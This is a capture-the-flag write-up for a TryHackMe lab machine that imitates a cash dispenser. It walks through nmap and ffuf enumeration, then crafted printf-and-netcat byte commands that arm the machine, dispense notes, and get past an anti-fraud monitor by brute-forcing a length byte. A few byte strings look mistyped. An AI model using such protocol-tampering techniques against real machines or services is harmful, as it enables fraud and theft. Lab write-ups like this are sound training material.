Jackpot
TryHackMe
16/10/2026

Author: k888

Difficulty: Medium

Tags: Linux

Overview
This room involved alot of trial and error and constructing unusual commands with bytes instead of plaintext

Enumeration:

I started with a basic nmap scan 

```shell
nmap -sC -sV <TARGETIP> -oN initialscan.txt
```

then I did some fuzzing

```shell
ffuf -u https://<TARGETIP>:8080/FUZZ -w wordlist.txt
```
(for the ffuf scan its important to run one quickly and figure out the word length of false positives, then use the -fs flag to filter these out)

Attack Steps: 
This nmap scan revealed a web page being served on port 8080. I accessed it on my browser with <TARGETIP>:8080. Inspecting the page source didnt uncover much of use, but I did save the script at the bottom in case it became useful later.

The ffuf scan didnt turn up much of use.

The next step was obvious as the webpage told you to download the executable 'jackpot' file and run it with the argument being the session code:

```shell
chmod +x jackpot
```

```shell
./jackpot <nonce>
```

The latter command returned an activation code, but with nowhere to use it yet I continued my search for an attack surface. I moved on from port 8080 to port 9100, which is where the challenge got interesting.

```shell
nc <TARGETIP> 9100
```

The terminal service on this port wasnt plaintext based, everything was in bytes. The response revealed important things with regards to querying the service, the expected format of the bytes, and a command (in byte-form, 0x0304) for getting a list of all commands.

Inkeeping with the requested format, I constructed my first request:

```shell
printf 'x01\x00\x00\x03\x04\x00\x00' | nc <TARGETIP> 9100
```

for clarity I'll break down each byte

'x01' - specifies a request rather than a command

'x00\x00\x03\x04' - the 4 byte command

'x00\x00' - the 2 byte length specifier of the data (0 because we arent actually sending any yet, but the fact that the format requires it is evidence that we almost definitely are able to use the activation code in this terminal)

In the command list returned, I found three commands that were particularly interesting. One for arming the machine, one for dispensing notes, and one for interacting with the 'monitor'. Appending the activation code onto my requests, I first sent a command to arm the machine:

```shell
printf '\x02\x00\x00\x04\xf0\x00\08%s' "<ACTIVATION_CODE>" | nc <TARGETIP> 9100
```

This was successful. Moving on, I then used the dispense command:

```shell
printf '\x02\x00\x00\x04\x01\x00\08%s' "<ACTIVATION_CODE>" | nc <TARGETIP> 9100
```

This was also successful, and told me that the remaining notes value had been updated from 280 to 240, dispensing the entirity of CST4.

I tried to run the same command once more, to continue dispensing the rest of the cassettes, but this resulted in a lockout, error message 'anomalous dispense with null transaction id'

This made me suspect that the nonce updates after every dispense, but even after double-checking that it had stayed the same before sending my next command, I still got a lockout.

The next step I took was to investigate the monitor_on boolean. I hadn't looked at this closely yet and I felt it was probobaly important given this machine apparently had some anti-fraud system to lock me out.

Sending the command itself didnt do anything. I also tried to send booleans as data, aswell as JSON. Below are some of the commands I tried, none of which updated monitor_on to false:

```shell
printf '\x02\x00\x00\x04\xf1\x00\x15{"monitor_on":false}' | nc <IP> 9100
```

```shell
printf '\x02\x00\x00\x04\xf1\x00\x11{"monitor":false}' | nc <IP> 9100
```

I eventually thought to abandon this value, and started searching the binary with Ghidra for some reference to a transaction ID, hoping I could find a breakthrough here, but there was nothing interesting.

I found the flag by bruteforcing the data length byte itself, like so:

```shell
printf '\x02\x00\x00\x04\xf1\x00\x<VALUE>' | nc <IP> 9100
```

the winning command was:

```shell
printf '\x02\x00\x00\x04\xf1\x00\x10' | nc <IP> 9100
```

this activated the flag command, which I then executed

the flag

![alt text](/images/flag!.png)

